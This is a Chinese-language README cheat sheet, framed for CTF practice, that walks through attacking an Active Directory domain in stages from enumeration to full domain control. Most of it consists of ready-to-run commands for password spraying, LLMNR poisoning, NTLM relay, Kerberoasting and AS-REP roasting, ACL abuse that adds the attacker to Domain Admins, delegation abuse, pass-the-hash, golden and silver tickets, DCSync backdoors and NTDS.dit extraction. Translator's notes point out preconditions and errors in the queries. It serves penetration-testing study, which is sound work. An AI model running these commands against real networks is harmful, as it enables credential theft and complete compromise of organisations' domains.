<a id="-active-directory-attack-methodology"></a>
# 🏢 Active Directory 攻击方法

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](./README.it.md) • [🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
           从普通用户到域管理员的分步指南            
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

<a id="-attack-path-overview"></a>
## 🗺️ 攻击路径概览

```
┌─────────────────────────────────────────────────────────────────────────┐
│                               AD 攻击方法                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   阶段 1：信息枚举        阶段 2：初始访问        阶段 3：权限提升      │
│   ├── 网络扫描            ├── 密码喷洒            ├── Kerberoast        │
│   ├── LDAP 枚举           ├── LLMNR 投毒          ├── AS-REP            │
│   ├── 用户枚举            └── NTLM 中继           └── ACL 滥用          │
│   └── BloodHound                                                        │
│                                                                         │
│   阶段 4：横向移动        阶段 5：持久化          阶段 6：控制域        │
│   ├── Pass-the-Hash       ├── 黄金票据            ├── DCSync            │
│   ├── WinRM/PSExec        ├── 白银票据            ├── NTDS.dit          │
│   └── WMI 执行            └── Skeleton Key        └── 完全控制！        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

<a id="-table-of-contents"></a>
## 📋 目录

1. [阶段 1：信息枚举](#-phase-1-enumeration)
2. [阶段 2：初始访问](#-phase-2-initial-access)
3. [阶段 3：权限提升](#-phase-3-privilege-escalation)
4. [阶段 4：横向移动](#-phase-4-lateral-movement)
5. [阶段 5：持久化](#-phase-5-persistence)
6. [阶段 6：控制域](#-phase-6-domain-dominance)
7. [常用命令速查](#-quick-command-reference)

---

<a id="-phase-1-enumeration"></a>
## 🔍 阶段 1：信息枚举

<a id="11-network-discovery"></a>
### 1.1 网络发现

```bash
# 查找域控制器
nmap -p 53,88,389,636,445 10.10.10.0/24

# 识别 AD 服务
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**关键端口:**
| 端口 | 服务 | 用途 |
|------|---------|---------|
| 53 | DNS | 域名解析 |
| 88 | Kerberos | 身份验证 |
| 389 | LDAP | 目录服务 |
| 445 | SMB | 文件共享 |
| 636 | LDAPS | 安全 LDAP |
| 5985 | WinRM | 远程管理 |

<a id="12-anonymous-enumeration-no-creds"></a>
### 1.2 匿名枚举（无凭据）

```bash
# RPC 空会话
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# LDAP 匿名绑定
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Kerbrute 用户枚举（无需凭据）
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

<a id="13-with-valid-credentials"></a>
### 1.3 使用有效凭据

```bash
# 获取域信息
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# LDAP 枚举
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

<a id="14-powerview-enumeration"></a>
### 1.4 PowerView 枚举

```powershell
# 导入 PowerView
Import-Module .\PowerView.ps1

# 域信息
Get-Domain
Get-DomainController

# 查找值得关注的目标
Get-DomainUser -SPN                    # Kerberoastable（可进行 Kerberoasting）
Get-DomainUser -PreauthNotRequired      # AS-REP roastable（可进行 AS-REP Roasting）
Get-DomainComputer -Unconstrained       # 委派

# 查找域管理员（DA）会话
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

<a id="15-bloodhound-collection"></a>
### 1.5 BloodHound 数据收集

```bash
# 从 Linux 收集（bloodhound-python）
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# 从 Windows 收集（SharpHound）
.\SharpHound.exe -c All
```

**BloodHound 查询:**
```cypher
# 到域管理员（DA）的最短路径
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# 可进行 Kerberoasting 的用户
MATCH (u:User {hasspn:true}) RETURN u.name

# 拥有 DCSync 权限的用户（查询局限见译注）
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

<a id="-phase-2-initial-access"></a>
## 🔑 阶段 2：初始访问

<a id="21-password-spraying"></a>
### 2.1 密码喷洒（Password Spraying）

```bash
# 使用 CrackMapExec 进行密码喷洒
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# 使用 Kerbrute 进行密码喷洒
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**常见密码:**
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

<a id="22-llmnrnbt-ns-poisoning"></a>
### 2.2 LLMNR/NBT-NS 投毒

```bash
# 终端 1：启动 Responder
sudo responder -I eth0 -wPv

# 等待捕获哈希材料……
# 已捕获 NTLMv2 材料！

# 终端 2：恢复哈希对应的密码
hashcat -m 5600 hash.txt rockyou.txt
```

<a id="23-ntlm-relay"></a>
### 2.3 NTLM 中继（NTLM Relay）

```bash
# 查找未要求 SMB 签名的目标
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder（SMB 已关闭；配置前提见译注）
sudo responder -I eth0

# 中继攻击
impacket-ntlmrelayx -tf relay.txt -smb2support
```

<a id="24-as-rep-roasting-no-password-required"></a>
### 2.4 AS-REP Roasting（无需密码）

```bash
# 查找符合利用条件的用户
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# 或使用凭据
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# 恢复密码
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="-phase-3-privilege-escalation"></a>
## ⬆️ 阶段 3：权限提升

<a id="31-kerberoasting"></a>
### 3.1 Kerberoasting（Kerberos 服务票据离线破解）

```bash
# 从 Linux 执行
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# 从 Windows 执行
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 恢复密码
hashcat -m 13100 kerberoast.txt rockyou.txt
```

<a id="32-acl-abuse"></a>
### 3.2 ACL 滥用

**对用户具有 GenericAll 权限:**
```powershell
# 更改密码
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**对组具有 GenericAll 权限:**
```powershell
# 将自己加入组
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# 设置 SPN 以进行 Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# 为自己授予 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

<a id="33-delegation-attacks"></a>
### 3.3 委派攻击

**非约束委派（Unconstrained Delegation）:**
```powershell
# 查找目标
Get-DomainComputer -Unconstrained

# 监视 TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# 触发（PrinterBug）
SpoolSample.exe DC01 YOURHOST
```

**约束委派（Constrained Delegation）:**
```bash
# 请求票据
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# 使用票据
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**基于资源的约束委派（RBCD）:**
```bash
# 创建计算机账户
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# 配置 RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# 获取票据
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="-phase-4-lateral-movement"></a>
## ➡️ 阶段 4：横向移动

<a id="41-pass-the-hash"></a>
### 4.1 哈希传递（Pass-the-Hash）

```bash
# 使用哈希进行 PSExec
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

<a id="42-pass-the-ticket"></a>
### 4.2 票据传递（Pass-the-Ticket）

```bash
# 导出票据
.\Rubeus.exe dump

# 使用票据（Linux）
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# 使用票据（Windows）
.\Rubeus.exe ptt /ticket:base64ticket
```

<a id="43-winrm"></a>
### 4.3 WinRM

```bash
# 使用密码进行 Evil-WinRM 连接
evil-winrm -i 10.10.10.10 -u admin -p password

# 使用哈希
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

<a id="44-overpass-the-hash"></a>
### 4.4 Overpass-the-Hash（使用哈希申请 Kerberos 票据）

```bash
# 使用哈希获取 TGT
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# 随后使用 Kerberos
dir \\server\share
```

---

<a id="-phase-5-persistence"></a>
## 🔒 阶段 5：持久化

<a id="51-golden-ticket"></a>
### 5.1 黄金票据（Golden Ticket）

```bash
# 所需材料：krbtgt NTLM 哈希 + 域 SID

# 创建票据
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# 使用
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

<a id="52-silver-ticket"></a>
### 5.2 白银票据（Silver Ticket）

```bash
# 创建服务票据
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

<a id="53-dcsync-backdoor"></a>
### 5.3 DCSync 后门

```powershell
# 为任意用户添加 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

<a id="-phase-6-domain-dominance"></a>
## 👑 阶段 6：控制域

<a id="61-dcsync"></a>
### 6.1 DCSync

```bash
# 导出所有哈希
impacket-secretsdump domain.local/admin:password@10.10.10.10

# 使用哈希
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# 指定用户
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

<a id="62-ntdsdit-extraction"></a>
### 6.2 NTDS.dit 提取

```bash
# 创建卷影副本
vssadmin create shadow /for=C:

# 复制 NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# 离线提取
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

<a id="63-crackmapexec-dump"></a>
### 6.3 使用 CrackMapExec 导出

```bash
# 通过 DCSync 导出 NTDS
crackmapexec smb DC01 -u admin -p password --ntds
```

---

<a id="-quick-command-reference"></a>
## 📊 常用命令速查

<a id="enumeration-one-liners"></a>
### 单行枚举命令

```bash
# 查找域控制器（DC）
nmap -p 88,389 --open 10.10.10.0/24

# 枚举用户（无需凭据）
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# 查找可进行 AS-REP Roasting 的账户
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

<a id="attack-cheatsheet"></a>
### 攻击速查表

| 攻击 | 命令 |
|--------|---------|
| 密码喷洒 | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roasting | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| 哈希传递（Pass-the-Hash） | `psexec.py -hashes :HASH domain.local/admin@target` |
| 黄金票据（Golden Ticket） | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

<a id="hash-cracking"></a>
### 哈希恢复

| 哈希类型 | Hashcat 模式 |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

<a id="-ctf-tips"></a>
## 🎯 CTF 技巧

1. **始终先做信息枚举** - 不要盲目攻击
2. **检查 AS-REP Roasting 条件** - 无需凭据即可获取相关哈希材料！
3. **运行 BloodHound** - 查找攻击路径
4. **检查 ACL** - 此处经常存在配置错误
5. **查找委派配置** - 可能提供较容易利用的路径
6. **谨慎进行密码喷洒** - 注意账户锁定！
7. **保存所有凭据** - 后续步骤可能还需要使用

---

<a id="-related-cheatsheets"></a>
## 📚 相关速查表

- [BloodHound](../../BloodHound/translations/README.zh-CN.md)
- [Impacket](../../Impacket/translations/README.zh-CN.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Rubeus](../../Rubeus/README.md)
- [PowerView](../../PowerView/README.md)
- [Responder](../../Responder/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/translations/README.zh-CN.md)

---

<p align="center">
  <b>🏢 从普通用户到域管理员！</b><br>
  <i>按照方法推进，掌控整个域</i>
</p>

> 译注：此流程列举的是有前提的可能路径，不保证能够按阶段依次提权；AS-REP Roasting 需要账户未要求 Kerberos 预身份验证，委派／ACL 利用也需要对应权限和配置。工具名称、收集器格式、Kerberos 加密类型及 Hashcat 模式须与实际版本和输入匹配。部分片段没有将输出保存到后续使用的文件，或前后文件名不同，需核对衔接；原始凭据、命令、文件名和查询保留原样。

> 译注：[BloodHound 的 DCSync 定义](https://bloodhound.specterops.io/resources/edges/dc-sync)要求 GetChanges 与 GetChangesAll 组合；示例查询用 OR 匹配其中任一关系，不能单独证明完整 DCSync 权限。查询语法还受 BloodHound／Neo4j 版本影响；[Cypher 注释规范](https://neo4j.com/docs/cypher-manual/current/syntax/comments/)使用 // 或 /* ... */，代码块中的 # 是原文保留的讲解标记，不应作为有效 Cypher 注释直接提交。

> 译注：中继片段中标注“SMB off”，但启动 Responder 的命令本身不会关闭其 SMB 服务；[官方配置](https://github.com/lgandx/Responder/blob/master/Responder.conf)单独控制这些服务，还须检查本机端口冲突。[Microsoft 的 SMB 签名说明](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)指出签名用于防御中继与伪造，具体默认要求依系统版本和版本分支而异；不能只据旧版示例推断现代环境可中继。
